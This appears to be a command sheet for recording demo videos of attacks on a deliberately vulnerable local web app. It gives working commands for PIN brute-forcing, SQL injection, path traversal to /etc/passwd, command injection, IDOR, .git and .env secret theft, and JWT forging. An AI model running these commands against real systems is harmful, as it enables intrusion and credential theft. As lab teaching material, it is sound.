# Attack commands (per reel)

All target the local app. During recording the host is `hacking.beamreach.ai`
(a loopback alias set by `setup.sh`); in plain `docker compose up` it's
`localhost:8899` (main) and `localhost:8898` (ops panel).

```bash
H=hacking.beamreach.ai      # or 127.0.0.1:8899 without setup.sh
```

### 1 — Brute-force a weak PIN (hydra)
```bash
hydra -l admin -x 4:4:1 -t 16 -I -V -f $H \
  http-post-form "/login:username=^USER^&pin=^PASS^:F=Invalid"
# -> login: admin  password: 1342
```

### 2 — SQL injection login bypass (curl / sqlmap)
```bash
curl -i "http://$H/login" --data-urlencode "username=admin' --" --data-urlencode "pin=x"
sqlmap -u "http://$H/login" --data "username=a&pin=1" -p username --dump -T users --batch
```

### 3 — Path traversal (curl)
```bash
curl "http://$H/download?file=../../../../etc/passwd"
```

### 4 — Command injection (curl)
```bash
curl "http://$H/tools/ping" --data-urlencode "host=8.8.8.8; id; cat /etc/passwd"
```

### 5 — IDOR (bash + curl)
```bash
for id in $(seq 1000 1012); do curl -s "http://$H/api/invoice/$id"; echo; done
```

### 6 — Exposed .git → secrets (git-dumper)
```bash
git-dumper "http://$H/.git" loot && cat loot/config.py
```

### 7 — Forge an admin JWT (jwt_tool / hashcat)
```bash
# grab a session cookie, crack the HS256 secret, flip role -> admin
jwt_tool "$TOKEN" -C -d wordlist.txt            # secret: vault
jwt_tool "$TOKEN" -T                            # tamper role=admin, re-sign
curl -H "Cookie: session=$FORGED" "http://$H/admin"
```

### 8 — Fuzz for /.env (ffuf)
```bash
ffuf -w wordlist.txt -u "http://$H/FUZZ" -mc 200
curl "http://$H/.env"
```

### 9 — Scan → default-creds panel (nmap)
```bash
nmap -p- $H                                     # finds :8080
curl -i "http://$H:8080/" -d "u=admin&p=admin"  # ACCESS GRANTED
```
